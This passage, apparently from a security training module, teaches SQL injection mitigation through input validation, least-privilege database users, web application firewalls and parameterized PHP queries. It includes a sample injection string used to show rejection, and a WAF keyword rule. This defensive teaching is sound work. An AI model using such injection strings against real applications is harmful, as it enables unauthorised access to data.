+<span class="hljs-variable">&lt;SNIP&gt;</span>
+</code></pre>
+<p>The code is modified to use the <a href="https://www.php.net/manual/en/function.preg-match.php">preg_match()</a> function, which checks if the input matches the given pattern or not. The pattern used is <code>[A-Za-z\s]+</code>, which will only match strings containing letters and spaces. Any other character will result in the termination of the script.</p>
+<p><img src="storage\modules\33\postgres\_copy\_write.png" alt=""></p>
+<p>We can test the following injection:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">'; SELECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>-- -
+</code></pre>
+<p><img src="storage\modules\33\postgres\_copy\_write.png" alt=""></p>
+<p>As seen in the images above, input with injected queries was rejected by the server.</p>
+<hr>
+<h3 id="user-privileges">User Privileges</h3>
+<p>As discussed initially, DBMS software allows the creation of users with fine-grained permissions. We should ensure that the user querying the database only has minimum permissions.</p>
+<p>Superusers and users with administrative privileges should never be used with web applications. These accounts have access to functions and features, which could lead to server compromise.</p>
+<p>Mitigating SQL Injection</p>
+<pre><code class="lang-shell-session"><span class="hljs-attribute">MariaDB</span> [(<span class="hljs-literal">none</span>)]&gt; CREATE USER <span class="hljs-string">'reader'</span>@<span class="hljs-string">'localhost'</span>;
+
+<span class="hljs-attribute">Query</span> OK, <span class="hljs-number">0</span> rows affected (<span class="hljs-number">0</span>.<span class="hljs-number">002</span> sec)
+
+
+MariaDB [(<span class="hljs-literal">none</span>)]&gt; GRANT SELECT ON ilfreight.ports TO <span class="hljs-string">'reader'</span>@<span class="hljs-string">'localhost'</span> IDENTIFIED BY <span class="hljs-string">'p<span class="hljs-variable">@ssw0Rd</span>!!'</span>;
+
+<span class="hljs-attribute">Query</span> OK, <span class="hljs-number">0</span> rows affected (<span class="hljs-number">0</span>.<span class="hljs-number">000</span> sec)
+</code></pre>
+<p>The commands above add a new MariaDB user named <code>reader</code> who is granted only <code>SELECT</code> privileges on the <code>ports</code> table. We can verify the permissions for this user by logging in:</p>
+<p>Mitigating SQL Injection</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ mysql -u reader -p
+
+MariaDB [(none)]&gt; use ilfreight;
+MariaDB [ilfreight]&gt; SHOW TABLES;
+
+<span class="hljs-code">+---------------------+</span>
+<span class="hljs-section">| Tables_in_ilfreight |
++---------------------+</span>
+<span class="hljs-section">| ports               |
++---------------------+</span>
+1 row in set (0.000 sec)
+
+
+MariaDB [ilfreight]&gt; SELECT SCHEMA<span class="hljs-emphasis">_NAME FROM INFORMATION_</span>SCHEMA.SCHEMATA;
+
+<span class="hljs-code">+--------------------+</span>
+<span class="hljs-section">| SCHEMA_NAME        |
++--------------------+</span>
+| information<span class="hljs-emphasis">_schema |
+| ilfreight          |
++--------------------+
+2 rows in set (0.000 sec)
+
+</span>
+MariaDB [ilfreight]&gt; SELECT * FROM ilfreight.credentials;
+ERROR 1142 (42000): SELECT command denied to user <span class="hljs-emphasis">'reader'</span>@<span class="hljs-emphasis">'localhost'</span> for table <span class="hljs-emphasis">'credentials'</span>
+</code></pre>
+<p>The snippet above confirms that the <code>reader</code> user cannot query other tables in the <code>ilfreight</code> database. The user only has access to the <code>ports</code> table that is needed by the application.</p>
+<hr>
+<h3 id="web-application-firewall">Web Application Firewall</h3>
+<p>Web Application Firewalls (WAF) are used to detect malicious input and reject any HTTP requests containing them. This helps in preventing SQL Injection even when the application logic is flawed. WAFs can be open-source (ModSecurity) or premium (Cloudflare). Most of them have default rules configured based on common web attacks. For example, any request containing the string <code>INFORMATION_SCHEMA</code> would be rejected, as it's commonly used while exploiting SQL injection.</p>
+<hr>
+<h3 id="parameterized-queries">Parameterized Queries</h3>
+<p>Another way to ensure that the input is safely sanitized is by using parameterized queries. Parameterized queries contain placeholders for the input data, which is then escaped and passed on by the drivers. Instead of directly passing the data into the SQL query, we use placeholders and then fill them with PHP functions.</p>
+<p>Consider the following modified code:</p>
+<p>Code: php</p>
+<pre><code class="lang-php">&lt;SNIP&gt;
+  $username = $_POST[<span class="hljs-string">'username'</span>]<span class="hljs-comment">;</span>
+  $password = $_POST[<span class="hljs-string">'password'</span>]<span class="hljs-comment">;</span>
+
+  $query = <span class="hljs-string">"SELECT * FROM logins WHERE username=? AND password = ?"</span> <span class="hljs-comment">;</span>
+  $stmt = mysqli_prepare($conn, $query)<span class="hljs-comment">;</span>
+  mysqli_stmt_bind_param($stmt, <span class="hljs-string">'ss'</span>, $username, $password)<span class="hljs-comment">;</span>
+  mysqli_stmt_execute($stmt)<span class="hljs-comment">;</span>
+  $result = mysqli_stmt_get_result($stmt)<span class="hljs-comment">;</span>
+
+  $row = mysqli_fetch_array($result)<span class="hljs-comment">;</span>
+  mysqli_stmt_close($stmt)<span class="hljs-comment">;</span>
+&lt;SNIP&gt;
+</code></pre>
+<p>The query is modified to contain two placeholders, marked with <code>?</code> where the username and password will be placed. We then bind the username and password to the query using the <a href="https://www.php.net/manual/en/mysqli-stmt.bind-param.php">mysqli_stmt_bind_param()</a> function. This will safely escape any quotes and place the values in the query.</p>
+<hr>
+<h3 id="conclusion">Conclusion</h3>
+<p>The list above is not exhaustive, and it could still be possible to exploit SQL injection based on the application logic. The code examples shown are based on PHP, but the logic applies across all common languages and libraries.</p>
+</div></body></html>
